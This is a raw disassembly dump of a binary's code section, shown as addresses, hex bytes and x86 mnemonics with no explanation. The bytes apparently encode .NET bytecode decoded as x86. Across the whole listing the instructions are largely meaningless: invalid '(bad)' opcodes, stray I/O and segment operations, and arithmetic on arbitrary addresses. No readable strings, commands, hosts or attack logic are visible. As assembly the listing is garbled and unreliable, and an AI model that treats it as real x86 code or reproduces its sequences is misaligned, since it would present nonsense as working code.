  4025cb:	fe 01                	incb   (%ecx)
  4025cd:	13 0d 11 0d 2c 24    	adc    0x242c0d11,%ecx
  4025d3:	00 7e 0c             	add    %bh,0xc(%esi)
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	04 6f                	add    $0x6f,%al
  4025da:	38 00                	cmp    %al,(%eax)
  4025dc:	00 0a                	add    %cl,(%edx)
  4025de:	00 14 80             	add    %dl,(%eax,%eax,4)
  4025e1:	0c 00                	or     $0x0,%al
  4025e3:	00 04 de             	add    %al,(%esi,%ebx,8)
  4025e6:	0f 25                	(bad)
  4025e8:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4025eb:	00 0a                	add    %cl,(%edx)
  4025ed:	0c 00                	or     $0x0,%al
  4025ef:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	00 00                	add    %al,(%eax)
  4025f9:	7e 1a                	jle    0x402615
  4025fb:	00 00                	add    %al,(%eax)
  4025fd:	04 6f                	add    $0x6f,%al
  4025ff:	39 00                	cmp    %eax,(%eax)
  402601:	00 0a                	add    %cl,(%edx)
  402603:	00 de                	add    %bl,%dh
  402605:	0f 25                	(bad)
  402607:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  40260a:	00 0a                	add    %cl,(%edx)
  40260c:	0d 00 28 2d 00       	or     $0x2d2800,%eax
  402611:	00 0a                	add    %cl,(%edx)
  402613:	de 00                	fiadds (%eax)
  402615:	00 de                	add    %bl,%dh
  402617:	10 25 28 2c 00 00    	adc    %ah,0x2c28
  40261d:	0a 13                	or     (%ebx),%dl
  40261f:	04 00                	add    $0x0,%al
  402621:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  402627:	00 00                	add    %al,(%eax)
  402629:	00 73 26             	add    %dh,0x26(%ebx)
  40262c:	00 00                	add    %al,(%eax)
  40262e:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402634:	73 3a                	jae    0x402670
  402636:	00 00                	add    %al,(%eax)
  402638:	0a 80 0c 00 00 04    	or     0x400000c(%eax),%al
  40263e:	7e 0c                	jle    0x40264c
  402640:	00 00                	add    %al,(%eax)
  402642:	04 20                	add    $0x20,%al
  402644:	00 20                	add    %ah,(%eax)
  402646:	03 00                	add    (%eax),%eax
  402648:	6f                   	outsl  %ds:(%esi),(%dx)
  402649:	3b 00                	cmp    (%eax),%eax
  40264b:	00 0a                	add    %cl,(%edx)
  40264d:	00 7e 0c             	add    %bh,0xc(%esi)
  402650:	00 00                	add    %al,(%eax)
  402652:	04 20                	add    $0x20,%al
  402654:	00 20                	add    %ah,(%eax)
  402656:	03 00                	add    (%eax),%eax
  402658:	6f                   	outsl  %ds:(%esi),(%dx)
  402659:	3c 00                	cmp    $0x0,%al
  40265b:	00 0a                	add    %cl,(%edx)
  40265d:	00 7e 0c             	add    %bh,0xc(%esi)
  402660:	00 00                	add    %al,(%eax)
  402662:	04 6f                	add    $0x6f,%al
  402664:	3d 00 00 0a 20       	cmp    $0x200a0000,%eax
  402669:	10 27                	adc    %ah,(%edi)
  40266b:	00 00                	add    %al,(%eax)
  40266d:	6f                   	outsl  %ds:(%esi),(%dx)
  40266e:	3e 00 00             	add    %al,%ds:(%eax)
  402671:	0a 00                	or     (%eax),%al
  402673:	7e 0c                	jle    0x402681
  402675:	00 00                	add    %al,(%eax)
  402677:	04 6f                	add    $0x6f,%al
  402679:	3d 00 00 0a 20       	cmp    $0x200a0000,%eax
  40267e:	10 27                	adc    %ah,(%edi)
  402680:	00 00                	add    %al,(%eax)
  402682:	6f                   	outsl  %ds:(%esi),(%dx)
  402683:	3f                   	aas
  402684:	00 00                	add    %al,(%eax)
  402686:	0a 00                	or     (%eax),%al
  402688:	7e 0c                	jle    0x402696
  40268a:	00 00                	add    %al,(%eax)
  40268c:	04 14                	add    $0x14,%al
  40268e:	72 75                	jb     0x402705
  402690:	01 00                	add    %eax,(%eax)
  402692:	70 18                	jo     0x4026ac
  402694:	8d 0a                	lea    (%edx),%ecx
  402696:	00 00                	add    %al,(%eax)
  402698:	01 13                	add    %edx,(%ebx)
  40269a:	09 11                	or     %edx,(%ecx)
  40269c:	09 16                	or     %edx,(%esi)
  40269e:	7e 13                	jle    0x4026b3
  4026a0:	00 00                	add    %al,(%eax)
  4026a2:	04 28                	add    $0x28,%al
  4026a4:	27                   	daa
  4026a5:	00 00                	add    %al,(%eax)
  4026a7:	06                   	push   %es
  4026a8:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4026ab:	00 0a                	add    %cl,(%edx)
  4026ad:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4026b0:	00 0a                	add    %cl,(%edx)
  4026b2:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4026b5:	00 0a                	add    %cl,(%edx)
  4026b7:	a2 00 11 09 17       	mov    %al,0x17091100
  4026bc:	7e 1d                	jle    0x4026db
  4026be:	00 00                	add    %al,(%eax)
  4026c0:	04 28                	add    $0x28,%al
  4026c2:	40                   	inc    %eax
  4026c3:	00 00                	add    %al,(%eax)
  4026c5:	0a 8c 2c 00 00 01 a2 	or     -0x5dff0000(%esp,%ebp,1),%cl
  4026cc:	00 11                	add    %dl,(%ecx)
  4026ce:	09 14 14             	or     %edx,(%esp,%edx,1)
  4026d1:	14 17                	adc    $0x17,%al
  4026d3:	28 41 00             	sub    %al,0x0(%ecx)
  4026d6:	00 0a                	add    %cl,(%edx)
  4026d8:	26 7e 13             	es jle 0x4026ee
  4026db:	00 00                	add    %al,(%eax)
  4026dd:	04 28                	add    $0x28,%al
  4026df:	27                   	daa
  4026e0:	00 00                	add    %al,(%eax)
  4026e2:	06                   	push   %es
  4026e3:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4026e6:	00 0a                	add    %cl,(%edx)
  4026e8:	28 22                	sub    %ah,(%edx)
  4026ea:	00 00                	add    %al,(%eax)
  4026ec:	0a 80 12 00 00 04    	or     0x4000012(%eax),%al
  4026f2:	17                   	pop    %ss
  4026f3:	80 0d 00 00 04 28 30 	orb    $0x30,0x28040000
  4026fa:	00 00                	add    %al,(%eax)
  4026fc:	06                   	push   %es
  4026fd:	28 39                	sub    %bh,(%ecx)
  4026ff:	00 00                	add    %al,(%eax)
  402701:	06                   	push   %es
  402702:	26 00 72 85          	add    %dh,%es:-0x7b(%edx)
  402706:	01 00                	add    %eax,(%eax)
  402708:	70 72                	jo     0x40277c
  40270a:	69 00 00 70 28 25    	imul   $0x25287000,(%eax),%eax
  402710:	00 00                	add    %al,(%eax)
  402712:	06                   	push   %es
  402713:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402716:	00 0a                	add    %cl,(%edx)
  402718:	72 69                	jb     0x402783
  40271a:	00 00                	add    %al,(%eax)
  40271c:	70 16                	jo     0x402734
  40271e:	28 42 00             	sub    %al,0x0(%edx)
  402721:	00 0a                	add    %cl,(%edx)
  402723:	13 0d 11 0d 2c 1a    	adc    0x1a2c0d11,%ecx
  402729:	11 05 7f 22 00 00    	adc    %eax,0x227f
  40272f:	04 28                	add    $0x28,%al
  402731:	21 00                	and    %eax,(%eax)
  402733:	00 06                	add    %al,(%esi)
  402735:	72 8b                	jb     0x4026c2
  402737:	01 00                	add    %eax,(%eax)
  402739:	70 28                	jo     0x402763
  40273b:	43                   	inc    %ebx
  40273c:	00 00                	add    %al,(%eax)
  40273e:	0a 13                	or     (%ebx),%dl
  402740:	05 2b 31 00 11       	add    $0x1100312b,%eax
  402745:	05 72 85 01 00       	add    $0x18572,%eax
  40274a:	70 72                	jo     0x4027be
  40274c:	69 00 00 70 28 25    	imul   $0x25287000,(%eax),%eax
  402752:	00 00                	add    %al,(%eax)
  402754:	06                   	push   %es
  402755:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402758:	00 0a                	add    %cl,(%edx)
  40275a:	28 22                	sub    %ah,(%edx)
  40275c:	00 00                	add    %al,(%eax)
  40275e:	0a 13                	or     (%ebx),%dl
  402760:	0a 12                	or     (%edx),%dl
  402762:	0a 28                	or     (%eax),%ch
  402764:	21 00                	and    %eax,(%eax)
  402766:	00 06                	add    %al,(%esi)
  402768:	72 8b                	jb     0x4026f5
  40276a:	01 00                	add    %eax,(%eax)
  40276c:	70 28                	jo     0x402796
  40276e:	43                   	inc    %ebx
  40276f:	00 00                	add    %al,(%eax)
  402771:	0a 13                	or     (%ebx),%dl
  402773:	05 00 1f 14 8d       	add    $0x8d141f00,%eax
  402778:	23 00                	and    (%eax),%eax
  40277a:	00 01                	add    %al,(%ecx)
  40277c:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  40277f:	0c 16                	or     $0x16,%al
  402781:	1b 8d 23 00 00 01    	sbb    0x1000023(%ebp),%ecx
  402787:	13 0b                	adc    (%ebx),%ecx
  402789:	11 0b                	adc    %ecx,(%ebx)
  40278b:	16                   	push   %ss
  40278c:	11 05 a2 00 11 0b    	adc    %eax,0xb1100a2
  402792:	17                   	pop    %ss
  402793:	7e 12                	jle    0x4027a7
  402795:	00 00                	add    %al,(%eax)
  402797:	04 a2                	add    $0xa2,%al
  402799:	00 11                	add    %dl,(%ecx)
  40279b:	0b 18                	or     (%eax),%ebx
  40279d:	72 91                	jb     0x402730
  40279f:	01 00                	add    %eax,(%eax)
  4027a1:	70 a2                	jo     0x402745
  4027a3:	00 11                	add    %dl,(%ecx)
  4027a5:	0b 19                	or     (%ecx),%ebx
  4027a7:	7e 1d                	jle    0x4027c6
  4027a9:	00 00                	add    %al,(%eax)
  4027ab:	04 a2                	add    $0xa2,%al
  4027ad:	00 11                	add    %dl,(%ecx)
  4027af:	0b 1a                	or     (%edx),%ebx
  4027b1:	72 8b                	jb     0x40273e
  4027b3:	01 00                	add    %eax,(%eax)
  4027b5:	70 a2                	jo     0x402759
  4027b7:	00 11                	add    %dl,(%ecx)
  4027b9:	0b 28                	or     (%eax),%ebp
  4027bb:	44                   	inc    %esp
  4027bc:	00 00                	add    %al,(%eax)
  4027be:	0a a2 00 11 0c 17    	or     0x170c1100(%edx),%ah
  4027c4:	7e 0e                	jle    0x4027d4
  4027c6:	00 00                	add    %al,(%eax)
  4027c8:	04 a2                	add    $0xa2,%al
  4027ca:	00 11                	add    %dl,(%ecx)
  4027cc:	0c 18                	or     $0x18,%al
  4027ce:	72 8b                	jb     0x40275b
  4027d0:	01 00                	add    %eax,(%eax)
  4027d2:	70 a2                	jo     0x402776
  4027d4:	00 11                	add    %dl,(%ecx)
  4027d6:	0c 19                	or     $0x19,%al
  4027d8:	7e 0f                	jle    0x4027e9
  4027da:	00 00                	add    %al,(%eax)
  4027dc:	04 a2                	add    $0xa2,%al
  4027de:	00 11                	add    %dl,(%ecx)
  4027e0:	0c 1a                	or     $0x1a,%al
  4027e2:	72 8b                	jb     0x40276f
  4027e4:	01 00                	add    %eax,(%eax)
  4027e6:	70 a2                	jo     0x40278a
  4027e8:	00 11                	add    %dl,(%ecx)
  4027ea:	0c 1b                	or     $0x1b,%al
  4027ec:	7e 14                	jle    0x402802
  4027ee:	00 00                	add    %al,(%eax)
  4027f0:	04 28                	add    $0x28,%al
  4027f2:	45                   	inc    %ebp
  4027f3:	00 00                	add    %al,(%eax)
  4027f5:	0a a2 00 11 0c 1c    	or     0x1c0c1100(%edx),%ah
  4027fb:	72 8b                	jb     0x402788
  4027fd:	01 00                	add    %eax,(%eax)
  4027ff:	70 a2                	jo     0x4027a3
  402801:	00 11                	add    %dl,(%ecx)
  402803:	0c 1d                	or     $0x1d,%al
  402805:	7e 15                	jle    0x40281c
  402807:	00 00                	add    %al,(%eax)
  402809:	04 28                	add    $0x28,%al
  40280b:	45                   	inc    %ebp
  40280c:	00 00                	add    %al,(%eax)
  40280e:	0a a2 00 11 0c 1e    	or     0x1e0c1100(%edx),%ah
  402814:	72 8b                	jb     0x4027a1
  402816:	01 00                	add    %eax,(%eax)
  402818:	70 a2                	jo     0x4027bc
  40281a:	00 11                	add    %dl,(%ecx)
  40281c:	0c 1f                	or     $0x1f,%al
  40281e:	09 7e 16             	or     %edi,0x16(%esi)
  402821:	00 00                	add    %al,(%eax)
  402823:	04 28                	add    $0x28,%al
  402825:	45                   	inc    %ebp
  402826:	00 00                	add    %al,(%eax)
  402828:	0a a2 00 11 0c 1f    	or     0x1f0c1100(%edx),%ah
  40282e:	0a 72 8b             	or     -0x75(%edx),%dh
  402831:	01 00                	add    %eax,(%eax)
  402833:	70 a2                	jo     0x4027d7
  402835:	00 11                	add    %dl,(%ecx)
  402837:	0c 1f                	or     $0x1f,%al
  402839:	0b 7e 0b             	or     0xb(%esi),%edi
  40283c:	00 00                	add    %al,(%eax)
  40283e:	04 28                	add    $0x28,%al
  402840:	45                   	inc    %ebp
  402841:	00 00                	add    %al,(%eax)
  402843:	0a a2 00 11 0c 1f    	or     0x1f0c1100(%edx),%ah
  402849:	0c 72                	or     $0x72,%al
  40284b:	8b 01                	mov    (%ecx),%eax
  40284d:	00 70 a2             	add    %dh,-0x5e(%eax)
  402850:	00 11                	add    %dl,(%ecx)
  402852:	0c 1f                	or     $0x1f,%al
  402854:	0d 7e 25 00 00       	or     $0x257e,%eax
  402859:	04 28                	add    $0x28,%al
  40285b:	45                   	inc    %ebp
  40285c:	00 00                	add    %al,(%eax)
  40285e:	0a a2 00 11 0c 1f    	or     0x1f0c1100(%edx),%ah
  402864:	0e                   	push   %cs
  402865:	72 8b                	jb     0x4027f2
  402867:	01 00                	add    %eax,(%eax)
  402869:	70 a2                	jo     0x40280d
  40286b:	00 11                	add    %dl,(%ecx)
  40286d:	0c 1f                	or     $0x1f,%al
  40286f:	0f 7e 28             	movd   %mm5,(%eax)
  402872:	00 00                	add    %al,(%eax)
  402874:	04 28                	add    $0x28,%al
  402876:	45                   	inc    %ebp
  402877:	00 00                	add    %al,(%eax)
  402879:	0a a2 00 11 0c 1f    	or     0x1f0c1100(%edx),%ah
  40287f:	10 72 8b             	adc    %dh,-0x75(%edx)
  402882:	01 00                	add    %eax,(%eax)
  402884:	70 a2                	jo     0x402828
  402886:	00 11                	add    %dl,(%ecx)
  402888:	0c 1f                	or     $0x1f,%al
  40288a:	11 7e 27             	adc    %edi,0x27(%esi)
  40288d:	00 00                	add    %al,(%eax)
  40288f:	04 28                	add    $0x28,%al
  402891:	45                   	inc    %ebp
  402892:	00 00                	add    %al,(%eax)
  402894:	0a a2 00 11 0c 1f    	or     0x1f0c1100(%edx),%ah
  40289a:	12 72 8b             	adc    -0x75(%edx),%dh
  40289d:	01 00                	add    %eax,(%eax)
  40289f:	70 a2                	jo     0x402843
  4028a1:	00 11                	add    %dl,(%ecx)
  4028a3:	0c 1f                	or     $0x1f,%al
  4028a5:	13 7e 2a             	adc    0x2a(%esi),%edi
  4028a8:	00 00                	add    %al,(%eax)
  4028aa:	04 28                	add    $0x28,%al
  4028ac:	45                   	inc    %ebp
  4028ad:	00 00                	add    %al,(%eax)
  4028af:	0a a2 00 11 0c 28    	or     0x280c1100(%edx),%ah
  4028b5:	44                   	inc    %esp
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	0a 13                	or     (%ebx),%dl
  4028ba:	05 72 95 01 00       	add    $0x19572,%eax
  4028bf:	70 7e                	jo     0x40293f
  4028c1:	24 00                	and    $0x0,%al
  4028c3:	00 04 12             	add    %al,(%edx,%edx,1)
  4028c6:	05 28 24 00 00       	add    $0x2428,%eax
  4028cb:	06                   	push   %es
  4028cc:	28 43 00             	sub    %al,0x0(%ebx)
  4028cf:	00 0a                	add    %cl,(%edx)
  4028d1:	28 39                	sub    %bh,(%ecx)
  4028d3:	00 00                	add    %al,(%eax)
  4028d5:	06                   	push   %es
  4028d6:	26 de 10             	ficoms %es:(%eax)
  4028d9:	25 28 2c 00 00       	and    $0x2c28,%eax
  4028de:	0a 13                	or     (%ebx),%dl
  4028e0:	06                   	push   %es
  4028e1:	00 28                	add    %ch,(%eax)
  4028e3:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  4028e8:	00 00                	add    %al,(%eax)
  4028ea:	de 16                	ficoms (%esi)
  4028ec:	25 28 2c 00 00       	and    $0x2c28,%eax
  4028f1:	0a 13                	or     (%ebx),%dl
  4028f3:	07                   	pop    %es
  4028f4:	00 16                	add    %dl,(%esi)
  4028f6:	80 0d 00 00 04 28 2d 	orb    $0x2d,0x28040000
  4028fd:	00 00                	add    %al,(%eax)
  4028ff:	0a de                	or     %dh,%bl
  402901:	00 00                	add    %al,(%eax)
  402903:	00 de                	add    %bl,%dh
  402905:	09 11                	or     %edx,(%ecx)
  402907:	08 28                	or     %ch,(%eax)
  402909:	46                   	inc    %esi
  40290a:	00 00                	add    %al,(%eax)
  40290c:	0a 00                	or     (%eax),%al
  40290e:	dc 7e 0d             	fdivrl 0xd(%esi)
  402911:	00 00                	add    %al,(%eax)
  402913:	04 0a                	add    $0xa,%al
  402915:	2b 00                	sub    (%eax),%eax
  402917:	06                   	push   %es
  402918:	2a 00                	sub    (%eax),%al
  40291a:	00 00                	add    %al,(%eax)
  40291c:	41                   	inc    %ecx
  40291d:	94                   	xchg   %eax,%esp
  40291e:	00 00                	add    %al,(%eax)
  402920:	00 00                	add    %al,(%eax)
  402922:	00 00                	add    %al,(%eax)
  402924:	38 00                	cmp    %al,(%eax)
  402926:	00 00                	add    %al,(%eax)
  402928:	13 00                	adc    (%eax),%eax
  40292a:	00 00                	add    %al,(%eax)
  40292c:	4b                   	dec    %ebx
  40292d:	00 00                	add    %al,(%eax)
  40292f:	00 0f                	add    %cl,(%edi)
  402931:	00 00                	add    %al,(%eax)
  402933:	00 20                	add    %ah,(%eax)
  402935:	00 00                	add    %al,(%eax)
  402937:	01 00                	add    %eax,(%eax)
  402939:	00 00                	add    %al,(%eax)
  40293b:	00 5d 00             	add    %bl,0x0(%ebp)
  40293e:	00 00                	add    %al,(%eax)
  402940:	0d 00 00 00 6a       	or     $0x6a000000,%eax
  402945:	00 00                	add    %al,(%eax)
  402947:	00 0f                	add    %cl,(%edi)
  402949:	00 00                	add    %al,(%eax)
  40294b:	00 20                	add    %ah,(%eax)
  40294d:	00 00                	add    %al,(%eax)
  40294f:	01 00                	add    %eax,(%eax)
  402951:	00 00                	add    %al,(%eax)
  402953:	00 26                	add    %ah,(%esi)
  402955:	00 00                	add    %al,(%eax)
  402957:	00 56 00             	add    %dl,0x0(%esi)
  40295a:	00 00                	add    %al,(%eax)
  40295c:	7c 00                	jl     0x40295e
  40295e:	00 00                	add    %al,(%eax)
  402960:	10 00                	adc    %al,(%eax)
  402962:	00 00                	add    %al,(%eax)
  402964:	20 00                	and    %al,(%eax)
  402966:	00 01                	add    %al,(%ecx)
  402968:	00 00                	add    %al,(%eax)
  40296a:	00 00                	add    %al,(%eax)
  40296c:	68 01 00 00 d5       	push   $0xd5000001
  402971:	01 00                	add    %eax,(%eax)
  402973:	00 3d 03 00 00 10    	add    %bh,0x10000003
  402979:	00 00                	add    %al,(%eax)
  40297b:	00 20                	add    %ah,(%eax)
  40297d:	00 00                	add    %al,(%eax)
  40297f:	01 00                	add    %eax,(%eax)
  402981:	00 00                	add    %al,(%eax)
  402983:	00 8e 00 00 00 c2    	add    %cl,-0x3e000000(%esi)
  402989:	02 00                	add    (%eax),%al
  40298b:	00 50 03             	add    %dl,0x3(%eax)
  40298e:	00 00                	add    %al,(%eax)
  402990:	16                   	push   %ss
  402991:	00 00                	add    %al,(%eax)
  402993:	00 20                	add    %ah,(%eax)
  402995:	00 00                	add    %al,(%eax)
  402997:	01 02                	add    %eax,(%edx)
  402999:	00 00                	add    %al,(%eax)
  40299b:	00 25 00 00 00 45    	add    %ah,0x45000000
  4029a1:	03 00                	add    (%eax),%eax
  4029a3:	00 6a 03             	add    %ch,0x3(%edx)
  4029a6:	00 00                	add    %al,(%eax)
  4029a8:	09 00                	or     %eax,(%eax)
  4029aa:	00 00                	add    %al,(%eax)
  4029ac:	00 00                	add    %al,(%eax)
  4029ae:	00 00                	add    %al,(%eax)
  4029b0:	13 30                	adc    (%eax),%esi
  4029b2:	01 00                	add    %eax,(%eax)
  4029b4:	15 00 00 00 10       	adc    $0x10000000,%eax
  4029b9:	00 00                	add    %al,(%eax)
  4029bb:	11 00                	adc    %eax,(%eax)
  4029bd:	02 50 28             	add    0x28(%eax),%dl
  4029c0:	47                   	inc    %edi
  4029c1:	00 00                	add    %al,(%eax)
  4029c3:	0a 0b                	or     (%ebx),%cl
  4029c5:	12 01                	adc    (%ecx),%al
  4029c7:	28 18                	sub    %bl,(%eax)
  4029c9:	00 00                	add    %al,(%eax)
  4029cb:	06                   	push   %es
  4029cc:	0a 2b                	or     (%ebx),%ch
  4029ce:	00 06                	add    %al,(%esi)
  4029d0:	2a 00                	sub    (%eax),%al
  4029d2:	00 00                	add    %al,(%eax)
  4029d4:	1b 30                	sbb    (%eax),%esi
  4029d6:	03 00                	add    (%eax),%eax
  4029d8:	41                   	inc    %ecx
  4029d9:	00 00                	add    %al,(%eax)
  4029db:	00 11                	add    %dl,(%ecx)
  4029dd:	00 00                	add    %al,(%eax)
  4029df:	11 00                	adc    %eax,(%eax)
  4029e1:	00 7e 10             	add    %bh,0x10(%esi)
  4029e4:	00 00                	add    %al,(%eax)
  4029e6:	04 6f                	add    $0x6f,%al
  4029e8:	48                   	dec    %eax
  4029e9:	00 00                	add    %al,(%eax)
  4029eb:	0a 6f 49             	or     0x49(%edi),%ch
  4029ee:	00 00                	add    %al,(%eax)
  4029f0:	0a 72 9d             	or     -0x63(%edx),%dh
  4029f3:	01 00                	add    %eax,(%eax)
  4029f5:	70 7e                	jo     0x402a75
  4029f7:	1f                   	pop    %ds
  4029f8:	00 00                	add    %al,(%eax)
  4029fa:	04 28                	add    $0x28,%al
  4029fc:	4a                   	dec    %edx
  4029fd:	00 00                	add    %al,(%eax)
  4029ff:	0a 17                	or     (%edi),%dl
  402a01:	6f                   	outsl  %ds:(%esi),(%dx)
  402a02:	4b                   	dec    %ebx
  402a03:	00 00                	add    %al,(%eax)
  402a05:	0a 02                	or     (%edx),%al
  402a07:	6f                   	outsl  %ds:(%esi),(%dx)
  402a08:	4c                   	dec    %esp
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	0a 00                	or     (%eax),%al
  402a0d:	de 0f                	fimuls (%edi)
  402a0f:	25 28 2c 00 00       	and    $0x2c28,%eax
  402a14:	0a 0a                	or     (%edx),%cl
  402a16:	00 28                	add    %ch,(%eax)
  402a18:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  402a1d:	00 00                	add    %al,(%eax)
  402a1f:	00 2a                	add    %ch,(%edx)
  402a21:	00 00                	add    %al,(%eax)
  402a23:	00 01                	add    %al,(%ecx)
  402a25:	10 00                	adc    %al,(%eax)
  402a27:	00 00                	add    %al,(%eax)
  402a29:	00 02                	add    %al,(%edx)
  402a2b:	00 2d 2f 00 0f 20    	add    %ch,0x200f002f
  402a31:	00 00                	add    %al,(%eax)
  402a33:	01 2a                	add    %ebp,(%edx)
  402a35:	00 16                	add    %dl,(%esi)
  402a37:	28 36                	sub    %dh,(%esi)
  402a39:	00 00                	add    %al,(%eax)
  402a3b:	06                   	push   %es
  402a3c:	00 00                	add    %al,(%eax)
  402a3e:	2a 00                	sub    (%eax),%al
  402a40:	13 30                	adc    (%eax),%esi
  402a42:	01 00                	add    %eax,(%eax)
  402a44:	11 00                	adc    %eax,(%eax)
  402a46:	00 00                	add    %al,(%eax)
  402a48:	08 00                	or     %al,(%eax)
  402a4a:	00 11                	add    %dl,(%ecx)
  402a4c:	00 02                	add    %al,(%edx)
  402a4e:	28 38                	sub    %bh,(%eax)
  402a50:	00 00                	add    %al,(%eax)
  402a52:	06                   	push   %es
  402a53:	28 4d 00             	sub    %cl,0x0(%ebp)
  402a56:	00 0a                	add    %cl,(%edx)
  402a58:	0a 2b                	or     (%ebx),%ch
  402a5a:	00 06                	add    %al,(%esi)
  402a5c:	2a 00                	sub    (%eax),%al
  402a5e:	00 00                	add    %al,(%eax)
  402a60:	1b 30                	sbb    (%eax),%esi
  402a62:	03 00                	add    (%eax),%eax
  402a64:	5f                   	pop    %edi
  402a65:	00 00                	add    %al,(%eax)
  402a67:	00 12                	add    %dl,(%edx)
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	11 00                	adc    %eax,(%eax)
  402a6d:	00 7e 10             	add    %bh,0x10(%esi)
  402a70:	00 00                	add    %al,(%eax)
  402a72:	04 6f                	add    $0x6f,%al
  402a74:	48                   	dec    %eax
  402a75:	00 00                	add    %al,(%eax)
  402a77:	0a 6f 49             	or     0x49(%edi),%ch
  402a7a:	00 00                	add    %al,(%eax)
  402a7c:	0a 72 9d             	or     -0x63(%edx),%dh
  402a7f:	01 00                	add    %eax,(%eax)
  402a81:	70 7e                	jo     0x402b01
  402a83:	1f                   	pop    %ds
  402a84:	00 00                	add    %al,(%eax)
  402a86:	04 28                	add    $0x28,%al
  402a88:	4a                   	dec    %edx
  402a89:	00 00                	add    %al,(%eax)
  402a8b:	0a 6f 4e             	or     0x4e(%edi),%ch
  402a8e:	00 00                	add    %al,(%eax)
  402a90:	0a 02                	or     (%edx),%al
  402a92:	03 28                	add    (%eax),%ebp
  402a94:	0c 00                	or     $0x0,%al
  402a96:	00 0a                	add    %cl,(%edx)
  402a98:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402a9b:	00 0a                	add    %cl,(%edx)
  402a9d:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402aa0:	00 0a                	add    %cl,(%edx)
  402aa2:	6f                   	outsl  %ds:(%esi),(%dx)
  402aa3:	4f                   	dec    %edi
  402aa4:	00 00                	add    %al,(%eax)
  402aa6:	0a 0a                	or     (%edx),%cl
  402aa8:	de 1f                	ficomps (%edi)
  402aaa:	de 18                	ficomps (%eax)
  402aac:	25 28 2c 00 00       	and    $0x2c28,%eax
  402ab1:	0a 0b                	or     (%ebx),%cl
  402ab3:	00 03                	add    %al,(%ebx)
  402ab5:	0a 28                	or     (%eax),%ch
  402ab7:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  402abc:	0c 28                	or     $0x28,%al
  402abe:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  402ac3:	00 00                	add    %al,(%eax)
  402ac5:	14 0a                	adc    $0xa,%al
  402ac7:	2b 00                	sub    (%eax),%eax
  402ac9:	06                   	push   %es
  402aca:	2a 00                	sub    (%eax),%al
  402acc:	01 10                	add    %edx,(%eax)
  402ace:	00 00                	add    %al,(%eax)
  402ad0:	00 00                	add    %al,(%eax)
  402ad2:	02 00                	add    (%eax),%al
  402ad4:	3e 40                	ds inc %eax
  402ad6:	00 18                	add    %bl,(%eax)
  402ad8:	20 00                	and    %al,(%eax)
  402ada:	00 01                	add    %al,(%ecx)
  402adc:	1b 30                	sbb    (%eax),%esi
  402ade:	08 00                	or     %al,(%eax)
  402ae0:	6e                   	outsb  %ds:(%esi),(%dx)
  402ae1:	00 00                	add    %al,(%eax)
  402ae3:	00 13                	add    %dl,(%ebx)
  402ae5:	00 00                	add    %al,(%eax)
  402ae7:	11 00                	adc    %eax,(%eax)
  402ae9:	00 72 b1             	add    %dh,-0x4f(%edx)
  402aec:	01 00                	add    %eax,(%eax)
  402aee:	70 28                	jo     0x402b18
  402af0:	50                   	push   %eax
  402af1:	00 00                	add    %al,(%eax)
  402af3:	0a 72 c9             	or     -0x37(%edx),%dh
  402af6:	01 00                	add    %eax,(%eax)
  402af8:	70 28                	jo     0x402b22
  402afa:	4a                   	dec    %edx
  402afb:	00 00                	add    %al,(%eax)
  402afd:	0a 13                	or     (%ebx),%dl
  402aff:	06                   	push   %es
  402b00:	14 13                	adc    $0x13,%al
  402b02:	07                   	pop    %es
  402b03:	16                   	push   %ss
  402b04:	0c 16                	or     $0x16,%al
  402b06:	0d 16 13 04 14       	or     $0x14041316,%eax
  402b0b:	13 08                	adc    (%eax),%ecx
  402b0d:	12 06                	adc    (%esi),%al
  402b0f:	12 07                	adc    (%edi),%al
  402b11:	08 12                	or     %dl,(%edx)
  402b13:	05 12 03 12 04       	add    $0x4120312,%eax
  402b18:	12 08                	adc    (%eax),%cl
  402b1a:	16                   	push   %ss
  402b1b:	28 1b                	sub    %bl,(%ebx)
  402b1d:	00 00                	add    %al,(%eax)
  402b1f:	06                   	push   %es
  402b20:	26 11 05 28 51 00 00 	adc    %eax,%es:0x5128
  402b27:	0a 0b                	or     (%ebx),%cl
  402b29:	de 24 25 28 2c 00 00 	fisubs 0x2c28(,%eiz,1)
  402b30:	0a 13                	or     (%ebx),%dl
  402b32:	09 00                	or     %eax,(%eax)
  402b34:	11 09                	adc    %ecx,(%ecx)
  402b36:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402b39:	00 0a                	add    %cl,(%edx)
  402b3b:	00 72 cd             	add    %dh,-0x33(%edx)
  402b3e:	01 00                	add    %eax,(%eax)
  402b40:	70 0b                	jo     0x402b4d
  402b42:	28 2d 00 00 0a 00    	sub    %ch,0xa0000
  402b48:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  402b4e:	00 00                	add    %al,(%eax)
  402b50:	07                   	pop    %es
  402b51:	0a 2b                	or     (%ebx),%ch
  402b53:	00 06                	add    %al,(%esi)
  402b55:	2a 00                	sub    (%eax),%al
  402b57:	00 01                	add    %al,(%ecx)
  402b59:	10 00                	adc    %al,(%eax)
  402b5b:	00 00                	add    %al,(%eax)
  402b5d:	00 02                	add    %al,(%edx)
  402b5f:	00 41 43             	add    %al,0x43(%ecx)
  402b62:	00 24 20             	add    %ah,(%eax,%eiz,1)
  402b65:	00 00                	add    %al,(%eax)
  402b67:	01 13                	add    %edx,(%ebx)
  402b69:	30 04 00             	xor    %al,(%eax,%eax,1)
  402b6c:	33 00                	xor    (%eax),%eax
